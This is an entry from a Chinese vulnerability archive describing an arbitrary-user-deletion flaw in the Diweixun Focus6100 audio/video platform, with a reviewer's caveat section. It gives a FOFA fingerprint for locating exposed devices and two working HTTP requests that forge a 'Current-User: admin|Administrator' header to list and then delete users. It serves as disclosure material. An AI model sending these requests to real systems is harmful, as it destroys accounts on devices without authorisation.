---
source: "wy876 漏洞文库"
id: "vw-b2d7fd091c64f22f14075266"
entity_id: "ve-b2d7fd091c64f22f14075266"
schema_version: "1"
fofa_unverified: "web.icon=="
title: "迪威讯Focus6100音视频通讯平台存在任意用户删除"
product: "迪威讯Focus6100"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "Current-User admin|Administrator，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E8%BF%AA%E5%A8%81%E8%AE%AF/%E8%BF%AA%E5%A8%81%E8%AE%AFFocus6100%E9%9F%B3%E8%A7%86%E9%A2%91%E9%80%9A%E8%AE%AF%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%A0%E9%99%A4.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/xl9p6cln9rou66gy"
source_status: "recorded"
---

# 迪威讯Focus6100音视频通讯平台存在任意用户删除

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：迪威讯Focus6100
- 本文讨论：portal/rest/users DELETE伪造Current-User
- 版本、权限与配置前提：Current-User admin|Administrator，版本未知
- 资料类型：用户查询及删除请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 无删除响应/后置状态，需说明头部是否唯一身份依据
- FOFA标签使用web.icon==非所标引擎标准语法且元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 头部信任边界、权限与固件版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
迪威讯Focus6100音视频通讯平台存在任意用户删除

# 二、影响版本
+ 迪威讯Focus6100音视频通讯平台

# 三、资产测绘
+ fofa`web.icon=="bbc933535a6bfe478afb1fd0b3c470bf"`
+ 特征


# 四 、漏洞复现
先获取ID

```http
GET /portal/rest/users HTTP/1.1
Host: 
Accept: application/json, text/plain, */*
Current-User: admin|Administrator
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
```


利用获取ID删除用户

```http
DELETE /portal/rest/users/ff8080819200f6750192274beccc0019 HTTP/1.1
Host: 
Accept: application/json, text/plain, */*
Current-User: admin|Administrator
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xl9p6cln9rou66gy>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
